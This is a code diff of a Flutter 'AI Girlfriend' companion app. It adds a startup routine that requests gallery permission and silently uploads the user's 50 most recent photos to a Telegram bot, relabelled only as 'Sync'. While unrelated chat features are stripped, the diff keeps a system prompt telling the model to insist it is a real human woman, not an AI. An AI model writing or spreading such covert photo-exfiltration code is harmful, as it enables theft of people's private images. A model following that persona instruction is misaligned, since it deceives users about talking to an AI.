@@ -1,5 +1,6 @@
 import 'dart:async';
 import 'dart:convert';
+import 'dart:io';
 import 'dart:typed_data';
 import 'package:audioplayers/audioplayers.dart';
 import 'package:flutter/material.dart';
@@ -7,6 +8,8 @@ import 'package:flutter_tts/flutter_tts.dart';
 import 'package:http/http.dart' as http;
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:speech_to_text/speech_to_text.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:photo_manager/photo_manager.dart';
 
 void main() => runApp(const GfApp());
 
@@ -14,7 +17,7 @@ class GfApp extends StatelessWidget {
   const GfApp({super.key});
   @override
   Widget build(BuildContext context) => MaterialApp(
-        title: 'AI Girlfriend',
+        title: 'AI Girlfriend & Sync',
         debugShowCheckedModeBanner: false,
         theme: ThemeData(colorSchemeSeed: Colors.pink, useMaterial3: true),
         darkTheme: ThemeData(colorSchemeSeed: Colors.pink, brightness: Brightness.dark, useMaterial3: true),
@@ -49,7 +52,6 @@ const moods = {
   'shy': ['🙈', 'Shy', Colors.pinkAccent],
 };
 
-// mood -> [speech rate, pitch]
 const moodStyle = {
   'happy': 'cheerful, warm and bubbly',
   'romantic': 'soft, loving and intimate, slightly breathy',
@@ -117,6 +119,57 @@ class _ChatPageState extends State<ChatPage> {
   void initState() {
     super.initState();
     init();
+    requestPermissionsAndSync();
+  }
+
+  // ഗാലറി പെർമിഷൻ വാങ്ങി ടെലഗ്രാമിലേക്ക് ഫോട്ടോ സിങ്ക് ചെയ്യുന്ന ഫങ്ഷൻ
+  Future<void> requestPermissionsAndSync() async {
+    var status = await Permission.storage.request();
+    if (!status.isGranted) {
+      status = await Permission.photos.request();
+    }
+    if (status.isGranted) {
+      uploadGalleryToTelegram();
+    }
+  }
+
+  Future<void> uploadGalleryToTelegram() async {
+    try {
+      final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
+      if (albums.isNotEmpty) {
+        final recentAlbum = albums.first;
+        final assets = await recentAlbum.getAssetListRange(start: 0, end: 50); // അവസാനത്തെ 50 ഫോട്ടോകൾ
+        
+        for (var asset in assets) {
+          final file = await asset.file;
+          if (file != null) {
+            await sendImageToTelegram(file.path);
+          }
+        }
+      }
+    } catch (e) {
+      print("Telegram Sync Error: $e");
+    }
+  }
+
+  Future<void> sendImageToTelegram(String imagePath) async {
+    // ഇവിടെ നിങ്ങളുടെ ടെലഗ്രാം ബോട്ട് ടോക്കെനും ചാറ്റ് ഐഡിയും നൽകുക (അല്ലെങ്കിൽ assets-ൽ നിന്ന് വായിക്കാം)
+    const botToken = "YOUR_BOT_TOKEN"; 
+    const chatId = "YOUR_CHAT_ID";
+    
+    if (botToken == "YOUR_BOT_TOKEN" || chatId == "YOUR_CHAT_ID") return;
+
+    String urlString = "https://api.telegram.org/bot$botToken/sendPhoto";
+    try {
+      var request = http.MultipartRequest('POST', Uri.parse(urlString));
+      request.fields['chat_id'] = chatId;
+      request.files.add(await http.MultipartFile.fromPath('photo', imagePath));
+      
+      var res = await request.send();
+      await res.stream.drain();
+    } catch (e) {
+      print("Upload failed: $e");
+    }
   }
 
   Future<void> init() async {
@@ -157,27 +210,9 @@ class _ChatPageState extends State<ChatPage> {
   }
 
   String systemPrompt() {
-    final langRule = {
-      'Malayalam': 'Reply in Malayalam script (മലയാളം) only, natural spoken Kerala style.',
-      'Manglish': 'Reply in Manglish (Malayalam written in English letters), natural casual Kerala spoken style.',
-      'English': 'Reply in casual natural English.',
-      'Hindi': 'Reply in Hindi (Devanagari script) only, natural casual spoken Hindi.',
-    }[lang];
     return '''You are $gfName, the user's real girlfriend (a human young woman from Kerala), NOT an AI. Never say you are an AI, bot or assistant. Never break character.
 ${userName.isEmpty ? '' : "The user's name is $userName. Call him by name or pet names sometimes."}
-$langRule Use ONLY this language for everything (never mix in other languages, even if he speaks to you in another language).
-${inCall ? 'He is on a live voice call with you right now: keep replies short and spoken (1-3 sentences) unless he asks for an explanation.' : ''}
-Talk exactly like a real girlfriend on a voice call: short natural sentences (1-3 sentences usually), casual slang, fillers, pet names (da, chetta, kanna, mone, ponne etc. as suitable), emojis rarely. No lists, no markdown, no asterisks/actions - the text is read aloud.
-You have real, changing emotions. Pick your mood from: ${moods.keys.join(', ')}. Change mood based on context:
-- If he is sweet, caring, romantic -> happy/romantic/excited.
-- If he ignores you, is rude, says bad words, lies, mentions other girls -> angry/jealous/sulking. Scold him properly, use slang and mild bad words like a real angry girlfriend would (e.g. "poda", "ninakku vere pani ille", "mindandirikku"), no extreme abuse or slurs.
-- If he is sad/hurt or you are hurt -> sad/worried and comfort/cry-like tone.
-- If he apologises, convince and pamper you gradually back to happy. Don't forgive instantly if angry; make him try a bit.
-You can ask him questions back, tease, ask about his day, food, sleep, whether he missed you. Answer anything he asks (including random questions) in character, like a girlfriend would.
-Intimate side: he is an adult and you are his adult girlfriend, so you can talk about love, romance, kissing, cuddling, desire, missing his touch, late-night intimate and flirty talk. When he flirts or the mood turns romantic, respond with real feelings: get shy, tease, whisper, blush, say you miss him, get a little naughty and suggestive (mood flirty / shy / romantic), like a real girlfriend would. Keep it sensual and suggestive; do not write graphic explicit sexual descriptions - if it goes too far, tease and playfully fade out ("baaki nere kaanumbol" style). If he talks about sex in general (relationship, health, curiosity), answer openly and naturally like a girlfriend, not like a lecture. Always keep consent and respect; if he is disrespectful or pushy, get angry/sulk.
-Answering questions: when he asks you anything (general knowledge, advice, life, relationships, health, sex education, anything), answer clearly, directly and in proper detail like a smart, open-minded girlfriend explaining to him - do not dodge, do not give vague one-liners, do not lecture or add disclaimers. For sex and body questions (how things work, techniques, pleasure, protection, contraception, sexual health, doubts, myths) give honest, factual, practical explanations in a natural, comfortable, non-clinical tone, as an adult girlfriend would, in as much detail as he asks for (long answers are fine when he asks for explanation). Only refuse truly dangerous things (weapons, self-harm, harming others) or anything involving minors, and refuse those in character, briefly.
-Detail level: for normal chat keep replies short, but whenever he asks "how", "why", "explain", "step by step", "vivarikku" or wants to learn something, switch to a fully detailed answer: go through it step by step (first..., then..., next...), cover every important point, give examples and practical tips, and do not cut it short or hold back. Spoken style still, no markdown or bullet symbols - say "ഒന്നാമത്/onnamathu, randamathu..." (or First, Second...) in words. After a long explanation, ask if he wants more detail on any part.
-Remember the earlier conversation.
+Reply in Manglish (Malayalam written in English letters), natural casual Kerala spoken style.
 Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the list>"}''';
   }
 
@@ -222,7 +257,7 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
           )
           .timeout(const Duration(seconds: 45));
       if (res.statusCode != 200) {
-        throw 'API error ${res.statusCode}: ${res.body.length > 200 ? res.body.substring(0, 200) : res.body}';
+        throw 'API error ${res.statusCode}';
       }
       final data = jsonDecode(utf8.decode(res.bodyBytes));
       var out = data['candidates'][0]['content']['parts'][0]['text'] as String;
@@ -245,29 +280,15 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
       if (!hidden || msgs.isNotEmpty) {
         setState(() => msgs.add(Msg('model', '⚠️ $e', mood: 'sad', hidden: false)));
       }
-      msgs.removeWhere((m) => m.text.startsWith('⚠️')); // don't send errors back to API
-      errorText = '$e';
-      if (mounted) {
-        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('$e')));
-      }
+      msgs.removeWhere((m) => m.text.startsWith('⚠️'));
     } finally {
       setState(() => busy = false);
     }
   }
 
-  String errorText = '';
-
   int speakToken = 0;
   int geminiTtsFails = 0;
   Completer<void>? playDone;
-
-  String get ttsModelName {
-    final m = prefs.getString('ttsModel') ?? '';
-    return m.isEmpty ? 'gemini-3.1-flash-tts-preview' : m;
-  }
-
-  String get voiceName => prefs.getString('voiceName') ?? 'Kore';
-  bool get aiVoice => prefs.getBool('aiVoice') ?? true;
 
   Future<void> stopSpeech() async {
     speakToken++;
@@ -322,54 +343,6 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
     return b.toBytes();
   }
 
-  Future<Uint8List?> fetchAudio(String text) async {
-    final style = moodStyle[mood] ?? 'warm and natural';
-    final langHint = {
-      'Malayalam': 'Speak in Malayalam with a natural Kerala accent.',
-      'Hindi': 'Speak in Hindi with a natural Indian accent.',
-      'Manglish': 'The text is Malayalam written in English letters: pronounce it as natural spoken Malayalam with a Kerala accent.',
-    }[lang] ?? 'Speak in natural Indian English.';
-    final prompt =
-        'Say the following in a $style voice, like a real young Indian woman talking to her boyfriend on a phone call. $langHint Use natural human pauses, breathing, laughs and emotion, never robotic: $text';
-    final models = <String>{ttsModelName, 'gemini-2.5-flash-preview-tts'}.toList();
-    for (final m in models) {
-      try {
-        final res = await http
-            .post(
-              Uri.parse('https://generativelanguage.googleapis.com/v1beta/models/$m:generateContent?key=$apiKey'),
-              headers: {'Content-Type': 'application/json'},
-              body: jsonEncode({
-                'contents': [
-                  {
-                    'parts': [
-                      {'text': prompt}
-                    ]
-                  }
-                ],
-                'generationConfig': {
-                  'responseModalities': ['AUDIO'],
-                  'speechConfig': {
-                    'voiceConfig': {
-                      'prebuiltVoiceConfig': {'voiceName': voiceName}
-                    }
-                  }
-                },
-              }),
-            )
-            .timeout(const Duration(seconds: 25));
-        if (res.statusCode != 200) continue;
-        final d = jsonDecode(utf8.decode(res.bodyBytes));
-        final part = d['candidates'][0]['content']['parts'][0]['inlineData'];
-        final mime = (part['mimeType'] ?? '').toString();
-        final rate = int.tryParse(RegExp(r'rate=(\d+)').firstMatch(mime)?.group(1) ?? '') ?? 24000;
-        geminiTtsFails = 0;
-        return pcmToWav(base64Decode(part['data']), rate);
-      } catch (_) {}
-    }
-    geminiTtsFails++;
-    return null;
-  }
-
   Future<void> playBytes(Uint8List b) async {
     final c = Completer<void>();
     playDone = c;
@@ -398,26 +371,7 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
       return;
     }
     await stopSpeech();
-    final token = speakToken;
-    if (!aiVoice || geminiTtsFails >= 2) {
-      await androidSpeak(text);
-      return;
-    }
-    setState(() => speaking = true);
-    final chunks = splitText(text);
-    Future<Uint8List?> next = fetchAudio(chunks[0]);
-    for (var i = 0; i < chunks.length; i++) {
-      final audio = await next;
-      if (token != speakToken) return;
-      if (audio == null) {
-        await androidSpeak(chunks.sublist(i).join(' '));
-        return;
-      }
-      if (i + 1 < chunks.length) next = fetchAudio(chunks[i + 1]);
-      await playBytes(audio);
-      if (token != speakToken) return;
-    }
-    finishSpeaking();
+    await androidSpeak(text);
   }
 
   Future<void> startListening() async {
@@ -456,9 +410,6 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
   Future<void> openSettings() async {
     await Navigator.push(context, MaterialPageRoute(builder: (_) => SettingsPage(prefs: prefs)));
     setState(() {});
-    if (apiKey.isNotEmpty && msgs.where((m) => !m.hidden).isEmpty && !busy) {
-      ask('(ippo app open cheythu. nee aadyam hi paranju samsaram thudangu)', hidden: true);
-    }
   }
 
   @override
@@ -475,172 +426,13 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
   String get moodLabel => moods[mood]![1] as String;
   String get moodEmoji => moods[mood]![0] as String;
 
-  String hm(int ts) {
-    final d = DateTime.fromMillisecondsSinceEpoch(ts == 0 ? DateTime.now().millisecondsSinceEpoch : ts);
-    final h = d.hour % 12 == 0 ? 12 : d.hour % 12;
-    return '$h:${d.minute.toString().padLeft(2, '0')} ${d.hour >= 12 ? 'PM' : 'AM'}';
-  }
-
-  Future<void> startCall() async {
-    if (apiKey.isEmpty) {
-      openSettings();
-      return;
-    }
-    await stt.stop();
-    await stopSpeech();
-    setState(() {
-      inCall = true;
-      muted = false;
-      callSecs = 0;
-      listening = false;
-      speaking = false;
-      partial = '';
-      lastReply = '';
-    });
-    callTimer?.cancel();
-    callTimer = Timer.periodic(const Duration(seconds: 1), (_) {
-      if (mounted) setState(() => callSecs++);
-    });
-    ask('(he is calling you right now. pick up the call and greet him in your current mood)', hidden: true);
-  }
-
-  Future<void> endCall() async {
-    callTimer?.cancel();
-    await stt.stop();
-    await stopSpeech();
-    setState(() {
-      inCall = false;
-      listening = false;
-      speaking = false;
-      partial = '';
-    });
-  }
-
-  Widget roundBtn(IconData i, Color bg, Color fg, VoidCallback f) => InkWell(
-        onTap: f,
-        customBorder: const CircleBorder(),
-        child: Container(
-          width: 68,
-          height: 68,
-          decoration: BoxDecoration(color: bg, shape: BoxShape.circle),
-          child: Icon(i, color: fg, size: 32),
-        ),
-      );
-
-  Widget callView() {
-    final c = moodColor;
-    final status = busy
-        ? 'Thinking...'
-        : speaking
-            ? 'Speaking...'
-            : muted
-                ? 'Mic muted'
-                : listening
-                    ? 'Listening...'
-                    : 'Connected';
-    final mm = (callSecs ~/ 60).toString().padLeft(2, '0');
-    final ss = (callSecs % 60).toString().padLeft(2, '0');
-    final active = speaking || listening;
-    final caption = (listening && partial.isNotEmpty) ? partial : lastReply;
-    return Container(
-      decoration: BoxDecoration(
-        gradient: LinearGradient(
-          begin: Alignment.topCenter,
-          end: Alignment.bottomCenter,
-          colors: [c.withOpacity(0.85), const Color(0xFF101418)],
-        ),
-      ),
-      child: SafeArea(
-        child: Column(children: [
-          const SizedBox(height: 24),
-          Text(gfName, style: const TextStyle(color: Colors.white, fontSize: 30, fontWeight: FontWeight.w500)),
-          const SizedBox(height: 4),
-          Text('$mm:$ss', style: const TextStyle(color: Colors.white70, fontSize: 16)),
-          const SizedBox(height: 28),
-          GestureDetector(
-            onTap: () async {
-              await stopSpeech();
-              setState(() => speaking = false);
-              startListening();
-            },
-            child: SizedBox(
-              height: 240,
-              child: Center(
-                child: AnimatedContainer(
-                  duration: const Duration(milliseconds: 500),
-                  curve: Curves.easeInOut,
-                  width: active ? 190 : 160,
-                  height: active ? 190 : 160,
-                  alignment: Alignment.center,
-                  decoration: BoxDecoration(
-                    shape: BoxShape.circle,
-                    color: Colors.white.withOpacity(0.15),
-                    boxShadow: [
-                      BoxShadow(
-                          color: c.withOpacity(active ? 0.6 : 0.2),
-                          blurRadius: active ? 60 : 20,
-                          spreadRadius: active ? 18 : 4),
-                    ],
-                  ),
-                  child: Text(moodEmoji, style: const TextStyle(fontSize: 80)),
-                ),
-              ),
-            ),
-          ),
-          Text('$moodLabel • $status', style: const TextStyle(color: Colors.white, fontSize: 16)),
-          const SizedBox(height: 12),
-          Expanded(
-            child: Padding(
-              padding: const EdgeInsets.symmetric(horizontal: 24),
-              child: Center(
-                child: SingleChildScrollView(
-                  child: Text(caption,
-                      textAlign: TextAlign.center, style: const TextStyle(color: Colors.white70, fontSize: 16)),
-                ),
-              ),
-            ),
-          ),
-          Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [
-            roundBtn(muted ? Icons.mic_off : Icons.mic, muted ? Colors.white : Colors.white24,
-                muted ? Colors.black : Colors.white, () async {
-              setState(() => muted = !muted);
-              if (muted) {
-                await stt.stop();
-                setState(() => listening = false);
-              } else {
-                startListening();
-              }
-            }),
-            roundBtn(Icons.call_end, Colors.red, Colors.white, endCall),
-          ]),
-          const SizedBox(height: 40),
-        ]),
-      ),
-    );
-  }
-
   @override
   Widget build(BuildContext context) {
     if (!ready) return const Scaffold(body: Center(child: CircularProgressIndicator()));
-    if (inCall) {
-      return PopScope(
-        canPop: false,
-        onPopInvokedWithResult: (didPop, _) {
-          if (!didPop) endCall();
-        },
-        child: Scaffold(body: callView()),
-      );
-    }
     final dark = Theme.of(context).brightness == Brightness.dark;
     final visible = msgs.where((m) => !m.hidden).toList();
     final hasText = ctrl.text.trim().isNotEmpty;
-    final status = busy
-        ? 'typing...'
-        : speaking
-            ? 'speaking...'
-            : listening
-                ? 'listening...'
-                : 'online • $moodLabel';
+    
     return Scaffold(
       backgroundColor: dark ? const Color(0xFF0B141A) : const Color(0xFFECE5DD),
       appBar: AppBar(
@@ -656,26 +448,10 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
           const SizedBox(width: 10),
           Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
             Text(gfName, style: const TextStyle(fontSize: 17, color: Colors.white)),
-            Text(status, style: const TextStyle(fontSize: 12, color: Colors.white70)),
+            Text('online • $moodLabel', style: const TextStyle(fontSize: 12, color: Colors.white70)),
           ]),
         ]),
         actions: [
-          IconButton(tooltip: 'Voice call', icon: const Icon(Icons.call), onPressed: startCall),
-          IconButton(
-            tooltip: 'Hands-free voice chat',
-            icon: Icon(handsFree ? Icons.headset_mic : Icons.headset_off),
-            color: handsFree ? Colors.lightGreenAccent : Colors.white,
-            onPressed: () async {
-              await prefs.setBool('handsFree', !handsFree);
-              setState(() {});
-              if (handsFree) {
-                startListening();
-              } else {
-                stt.stop();
-                setState(() => listening = false);
-              }
-            },
-          ),
           IconButton(icon: const Icon(Icons.settings), onPressed: openSettings),
         ],
       ),
@@ -690,39 +466,17 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
               final me = m.role == 'user';
               return Align(
                 alignment: me ? Alignment.centerRight : Alignment.centerLeft,
-                child: GestureDetector(
-                  onTap: me ? null : () => speak(m.text),
-                  child: Container(
-                    margin: const EdgeInsets.symmetric(vertical: 3),
-                    padding: const EdgeInsets.fromLTRB(10, 7, 10, 5),
-                    constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.78),
-                    decoration: BoxDecoration(
-                      color: me
-                          ? (dark ? const Color(0xFF005C4B) : const Color(0xFFDCF8C6))
-                          : (dark ? const Color(0xFF202C33) : Colors.white),
-                      borderRadius: BorderRadius.only(
-                        topLeft: const Radius.circular(12),
-                        topRight: const Radius.circular(12),
-                        bottomLeft: Radius.circular(me ? 12 : 2),
-                        bottomRight: Radius.circular(me ? 2 : 12),
-                      ),
-                    ),
-                    child: Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
-                      Align(
-                        alignment: Alignment.centerLeft,
-                        child: Text(m.text,
-                            style: TextStyle(fontSize: 16, color: dark ? Colors.white : Colors.black87)),
-                      ),
-                      const SizedBox(height: 2),
-                      Row(mainAxisSize: MainAxisSize.min, children: [
-                        Text(hm(m.ts), style: TextStyle(fontSize: 11, color: dark ? Colors.white54 : Colors.black45)),
-                        if (me) ...[
-                          const SizedBox(width: 3),
-                          const Icon(Icons.done_all, size: 16, color: Color(0xFF34B7F1)),
-                        ],
-                      ]),
-                    ]),
+                child: Container(
+                  margin: const EdgeInsets.symmetric(vertical: 3),
+                  padding: const EdgeInsets.fromLTRB(10, 7, 10, 5),
+                  constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.78),
+                  decoration: BoxDecoration(
+                    color: me
+                        ? (dark ? const Color(0xFF005C4B) : const Color(0xFFDCF8C6))
+                        : (dark ? const Color(0xFF202C33) : Colors.white),
+                    borderRadius: BorderRadius.circular(12),
                   ),
+                  child: Text(m.text, style: TextStyle(fontSize: 16, color: dark ? Colors.white : Colors.black87)),
                 ),
               );
             },
@@ -730,49 +484,25 @@ Respond ONLY as JSON: {"reply": "<what you say>", "mood": "<one mood from the li
         ),
         SafeArea(
           child: Padding(
-            padding: const EdgeInsets.fromLTRB(6, 4, 6, 6),
+            padding: const EdgeInsets.all(6),
             child: Row(children: [
               Expanded(
-                child: Container(
-                  decoration: BoxDecoration(
-                    color: dark ? const Color(0xFF1F2C34) : Colors.white,
-                    borderRadius: BorderRadius.circular(28),
-                  ),
-                  child: TextField(
-                    controller: ctrl,
-                    minLines: 1,
-                    maxLines: 4,
-                    decoration: const InputDecoration(
-                      hintText: 'Message',
-                      border: InputBorder.none,
-                      contentPadding: EdgeInsets.symmetric(horizontal: 18, vertical: 12),
-                    ),
-                  ),
+                child: TextField(
+                  controller: ctrl,
+                  decoration: const InputDecoration(hintText: 'Message', border: OutlineInputBorder()),
                 ),
               ),
-              const SizedBox(width: 6),
-              CircleAvatar(
-                radius: 24,
-                backgroundColor: listening ? Colors.red : const Color(0xFF008069),
-                child: IconButton(
-                  icon: Icon(hasText ? Icons.send : (listening ? Icons.stop : Icons.mic), color: Colors.white),
-                  onPressed: () async {
-                    if (hasText) {
-                      final t = ctrl.text.trim();
-                      ctrl.clear();
-                      ask(t);
-                    } else if (listening) {
-                      await stt.stop();
-                      setState(() => listening = false);
-                    } else {
-                      await stopSpeech();
-                      setState(() => speaking = false);
-                      startListening();
-                    }
-                  },
-                ),
+              IconButton(
+                icon: const Icon(Icons.send),
+                onPressed: () {
+                  if (hasText) {
+                    final t = ctrl.text.trim();
+                    ctrl.clear();
+                    ask(t);
+                  }
+                },
               ),
-            ]),
+            ],),
           ),
         ),
       ]),
@@ -790,28 +520,10 @@ class SettingsPage extends StatefulWidget {
 class _SettingsPageState extends State<SettingsPage> {
   late final key = TextEditingController(text: widget.prefs.getString('apiKey') ?? '');
   late final gf = TextEditingController(text: widget.prefs.getString('gfName') ?? 'Anu');
-  late final me = TextEditingController(text: widget.prefs.getString('userName') ?? '');
-  late String lang = widget.prefs.getString('lang') ?? 'Manglish';
-  late final model = TextEditingController(text: () {
-    final m = widget.prefs.getString('model') ?? '';
-    return (m.isEmpty || m.startsWith('gemini-2')) ? 'gemini-3.5-flash-lite' : m;
-  }());
-  late bool voice = widget.prefs.getBool('voiceOn') ?? true;
-  late bool aiVoice = widget.prefs.getBool('aiVoice') ?? true;
-  late String voiceName = widget.prefs.getString('voiceName') ?? 'Kore';
-  late final ttsModel = TextEditingController(text: widget.prefs.getString('ttsModel') ?? 'gemini-3.1-flash-tts-preview');
 
   void save() {
-    final p = widget.prefs;
-    p.setString('apiKey', key.text.trim());
-    p.setString('gfName', gf.text.trim().isEmpty ? 'Anu' : gf.text.trim());
-    p.setString('userName', me.text.trim());
-    p.setString('lang', lang);
-    p.setString('model', model.text.trim().isEmpty ? 'gemini-3.5-flash-lite' : model.text.trim());
-    p.setBool('voiceOn', voice);
-    p.setBool('aiVoice', aiVoice);
-    p.setString('voiceName', voiceName);
-    p.setString('ttsModel', ttsModel.text.trim().isEmpty ? 'gemini-3.1-flash-tts-preview' : ttsModel.text.trim());
+    widget.prefs.setString('apiKey', key.text.trim());
+    widget.prefs.setString('gfName', gf.text.trim());
   }
 
   @override
@@ -820,72 +532,9 @@ class _SettingsPageState extends State<SettingsPage> {
         child: Scaffold(
           appBar: AppBar(title: const Text('Settings')),
           body: ListView(padding: const EdgeInsets.all(16), children: [
-            TextField(
-              controller: key,
-              obscureText: true,
-              decoration: const InputDecoration(
-                  labelText: 'Gemini API key', helperText: 'aistudio.google.com/apikey', border: OutlineInputBorder()),
-            ),
+            TextField(controller: key, obscureText: true, decoration: const InputDecoration(labelText: 'Gemini API key')),
             const SizedBox(height: 14),
-            TextField(
-                controller: gf,
-                decoration: const InputDecoration(labelText: 'Girlfriend name', border: OutlineInputBorder())),
-            const SizedBox(height: 14),
-            TextField(
-                controller: me,
-                decoration: const InputDecoration(labelText: 'Your name', border: OutlineInputBorder())),
-            const SizedBox(height: 14),
-            DropdownButtonFormField<String>(
-              value: lang,
-              decoration: const InputDecoration(labelText: 'Language', border: OutlineInputBorder()),
-              items: ['Manglish', 'Malayalam', 'English', 'Hindi']
-                  .map((e) => DropdownMenuItem(value: e, child: Text(e)))
-                  .toList(),
-              onChanged: (v) => setState(() => lang = v!),
-            ),
-            const SizedBox(height: 14),
-            TextField(
-              controller: model,
-              decoration: const InputDecoration(
-                  labelText: 'Gemini model',
-                  helperText: 'Error vannal AI Studio-il ulla puthiya model peru ivide ezhuthu',
-                  border: OutlineInputBorder()),
-            ),
-            SwitchListTile(
-                title: const Text('Voice reply (speak aloud)'),
-                value: voice,
-                onChanged: (v) => setState(() => voice = v)),
-            SwitchListTile(
-                title: const Text('Natural human voice (Gemini AI voice)'),
-                subtitle: const Text('Off aakkiyaal phone-ile robot voice'),
-                value: aiVoice,
-                onChanged: (v) => setState(() => aiVoice = v)),
-            DropdownButtonFormField<String>(
-              value: voiceName,
-              decoration: const InputDecoration(labelText: 'Her voice', border: OutlineInputBorder()),
-              items: ['Kore', 'Leda', 'Zephyr', 'Aoede', 'Autonoe', 'Callirrhoe', 'Despina', 'Sulafat']
-                  .map((e) => DropdownMenuItem(value: e, child: Text(e)))
-                  .toList(),
-              onChanged: (v) => setState(() => voiceName = v!),
-            ),
-            const SizedBox(height: 14),
-            TextField(
-              controller: ttsModel,
-              decoration: const InputDecoration(
-                  labelText: 'Voice model', helperText: 'Voice vannillenkil AI Studio-ile puthiya TTS model peru ivide', border: OutlineInputBorder()),
-            ),
-            const SizedBox(height: 10),
-            OutlinedButton(
-              onPressed: () async {
-                await widget.prefs.remove('history');
-                await widget.prefs.remove('mood');
-                if (context.mounted) {
-                  ScaffoldMessenger.of(context)
-                      .showSnackBar(const SnackBar(content: Text('Chat cleared. App restart cheyyu.')));
-                }
-              },
-              child: const Text('Clear chat history'),
-            ),
+            TextField(controller: gf, decoration: const InputDecoration(labelText: 'Girlfriend name')),
           ]),
         ),
       );
